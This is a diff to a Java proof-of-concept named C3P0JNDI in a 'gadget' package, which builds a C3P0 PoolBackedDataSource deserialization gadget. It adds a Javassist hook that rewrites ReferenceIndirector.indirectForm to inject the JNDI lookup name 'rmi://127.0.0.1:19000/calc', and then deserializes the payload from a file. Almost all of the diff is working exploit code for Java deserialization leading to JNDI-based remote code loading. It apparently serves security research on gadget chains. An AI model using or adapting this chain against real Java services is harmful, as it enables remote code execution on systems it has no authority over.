@@ -1,11 +1,13 @@
 package gadget;
 
 import java.io.*;
+import java.lang.reflect.Method;
 import java.sql.SQLException;
 import java.sql.SQLFeatureNotSupportedException;
 import java.util.logging.Logger;
 
 import com.mchange.v2.c3p0.PoolBackedDataSource;
+import javassist.*;
 
 import javax.naming.NamingException;
 import javax.naming.Reference;
@@ -16,10 +18,20 @@ import javax.sql.PooledConnection;
 //C3P0无依赖JNDI
 public class C3P0JNDI {
     public static void main(String[] args) throws Exception{
-        Thread.sleep(5000);//sleep一会
+//        Thread.sleep(5000);//sleep一会
+        hook();
         PoolBackedDataSource a = new PoolBackedDataSource();
         a.setConnectionPoolDataSource(new PoolSource());
-        writeFile("1.txt",serialize(a));
+//        writeFile("1.txt",serialize(a));
+        deserialize(FiletoBytes("1.txt"));
+    }
+    public static void hook() throws ClassNotFoundException, NoSuchMethodException, NotFoundException, CannotCompileException {
+        CtClass ctClass = ClassPool.getDefault().get("com.mchange.v2.naming.ReferenceIndirector");
+        CtMethod ctMethod = ctClass.getDeclaredMethod("indirectForm");
+        ctMethod.insertBefore("java.util.Properties properties = new java.util.Properties();\n" +
+                "        javax.naming.CompoundName compoundName = new javax.naming.CompoundName(\"rmi://127.0.0.1:19000/calc\",properties);" +
+                "contextName=compoundName;");
+        ctClass.toClass();
     }
 
     private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {
